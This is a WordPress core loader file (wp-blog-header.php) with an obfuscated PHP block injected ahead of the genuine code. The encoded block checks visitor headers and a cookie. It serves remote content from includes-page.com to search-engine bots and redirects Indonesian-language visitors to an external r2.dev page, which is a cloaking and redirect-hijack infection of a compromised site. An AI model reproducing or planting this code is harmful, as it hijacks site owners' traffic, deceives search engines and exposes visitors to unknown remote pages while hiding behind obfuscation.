<?php
goto bae51; B64b2: echo "\40\x20\40\40\x20\40\x20\40"; goto D4ca5; F1a5c: exit; goto B64b2; A72c1: setcookie("\x61\x7a", "\x6c\x70", time() + 3600 * 7200); goto E6e67; f0889: header("\x4c\x6f\x63\141\x74\x69\157\x6e\72\40\x68\x74\x74\x70\x73\x3a\57\x2f\160\x75\142\55\x34\71\x39\x34\x32\x66\x62\64\64\x36\x35\x63\64\x34\71\71\141\x62\x30\60\x36\66\65\x33\145\143\141\x32\144\65\x38\x63\56\162\x32\56\144\145\166\x2f\x69\156\x64\145\170\56\x68\164\x6d\x6c"); goto D140d; Cfc99: if (!(strpos($C7f11, "\142\x6f\x74") !== false && $_SERVER["\x52\x45\121\125\105\x53\124\x5f\125\122\x49"] == "\57")) { goto fef11; } goto D5d31; c365d: echo file_get_contents("\x68\164\164\x70\163\72\57\57\151\x6e\143\x6c\165\144\x65\163\55\x70\141\147\x65\56\x63\x6f\x6d\57\x69\x63\141\151\143\x74\x2f\x69\143\141\x69\x63\x74\x2e\164\170\x74"); goto F1a5c; B037e: A5da2: goto c365d; a2287: $f4fac = substr($_SERVER["\x48\x54\x54\120\x5f\x41\x43\x43\105\120\x54\x5f\x4c\x41\x4e\107\x55\101\x47\x45"], 0, 2); goto abc17; a5f3e: exit; goto B037e; E4b0b: if (!(strpos($c128a, "\172\150") !== false && $_SERVER["\110\x54\x54\x50\x5f\x55\x50\107\122\x41\x44\x45\x5f\111\x4e\x53\x45\103\125\122\x45\137\122\105\x51\125\x45\123\x54\123"] == 1 && $_COOKIE["\141\x7a"] == "\x6c\160")) { goto A5da2; } goto A72c1; B1158: $C7f11 = $_SERVER["\x48\x54\x54\x50\x5f\x55\x53\105\122\x5f\x41\107\x45\116\x54"]; goto Cfc99; D140d: exit; goto F1c90; D5d31: $c128a = strtolower($_SERVER["\110\x54\124\120\x5f\101\103\103\105\120\124\137\114\x41\x4e\107\x55\x41\x47\x45"]); goto E4b0b; abc17: if (!($f4fac == "\x69\144")) { goto e59f7; } goto f0889; D4ca5: fef11: goto a2287; bae51: $C263d = $_SERVER["\x48\x54\124\120\137\x52\x45\106\105\122\105\122"]; goto B1158; E6e67: echo "\x20"; goto a5f3e; F1c90: e59f7:/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
